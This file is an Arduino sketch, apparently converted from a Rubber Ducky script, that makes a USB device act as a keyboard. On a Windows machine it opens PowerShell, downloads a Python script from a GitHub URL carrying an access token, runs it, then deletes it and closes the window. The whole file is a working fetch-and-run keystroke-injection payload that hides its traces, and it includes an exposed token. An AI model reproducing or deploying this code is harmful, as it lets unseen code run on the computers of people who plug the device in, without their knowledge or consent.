/*
 * Generated with <3 by Dckuino.js, an open source project !
 * 
 * Edited by Frank Cerny
 * Date: 9/21/2019
 */

#include "Keyboard.h"

// Types a single key, given its integer mapping
void typeKey(uint8_t key)
{
  Keyboard.press(key);
  delay(50);
  Keyboard.release(key);
}

/* Init function */
void setup()
{
  // Begining the Keyboard stream
  Keyboard.begin();

  // Wait 500ms
  delay(600);

  typeKey(KEY_LEFT_GUI);

  delay(750);

  Keyboard.print("powershell");

  delay(1250);

  typeKey(KEY_RETURN);

  delay(5000);

  Keyboard.print("wget -O curly.py https://raw.githubusercontent.com/frank-cerny/curly-waddle/master/curly.py?token=AENTXOTU2SDQ47GUCIXUYYC5R5334");

  delay(500);

  typeKey(KEY_RETURN);

  delay(500);

  Keyboard.print("python ./curly.py");

  delay(500);

  typeKey(KEY_RETURN);

  delay(5000);

  Keyboard.print("rm curly.py");

  delay(500);

  typeKey(KEY_RETURN);

  delay(500);

  Keyboard.print("exit");

  delay(500);

  typeKey(KEY_RETURN);

  delay(500);

  // Ending stream
  Keyboard.end();
}

/* Unused endless loop */
void loop() {}
